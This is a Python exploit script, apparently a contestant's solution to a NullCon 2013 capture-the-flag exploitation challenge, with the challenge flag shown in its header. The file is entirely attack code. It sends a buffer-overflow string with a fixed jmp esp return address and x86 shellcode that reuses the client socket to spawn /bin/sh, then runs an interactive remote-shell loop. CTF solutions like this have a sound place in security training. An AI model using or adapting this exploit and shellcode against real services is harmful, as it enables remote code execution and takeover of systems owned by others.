#!/usr/bin/python
#
# NullCon 2013 CTF - Battle Underground
# Exploitation 4 - 200 points (ASLR)
# danigargu @ w3b0n3s
# Flag: 794fc8e2576887bedd36b20757a533a3
#

import os
import sys
import time
from socket import *
from struct import pack

p = lambda x : pack("<L" , x)

s = socket(AF_INET, SOCK_STREAM)
s.connect(('127.0.0.1', 6791))
#s.connect(('nullcon-e3.no-ip.org', 6791))

junk = "B:B:" + "A"*124

jmp_esp = p(0x08048827)  # jmp esp
fd = 4                   # socket client fd

payload = jmp_esp

# shellcode - socket reuse
# dup2(4,0) & dup2(4,1) & dup2(4,2) & execve("/bin/sh", 0, 0)
payload += ("\x31\xc9\x31\xdb\xb3" + chr(fd) + "\x6a\x3f\x58\xcd\x80"
            "\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
            "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80")

s.recv(255)
s.send(junk + payload)
time.sleep(0.5)

# interact with the shell
while True:
	try:
		sys.stdout.write("$ ")
		sys.stdout.flush()
		c = sys.stdin.readline()
		s.send(c)
		time.sleep(0.5)
		sys.stdout.write(s.recv(4095))
	except KeyboardInterrupt, e:
		break


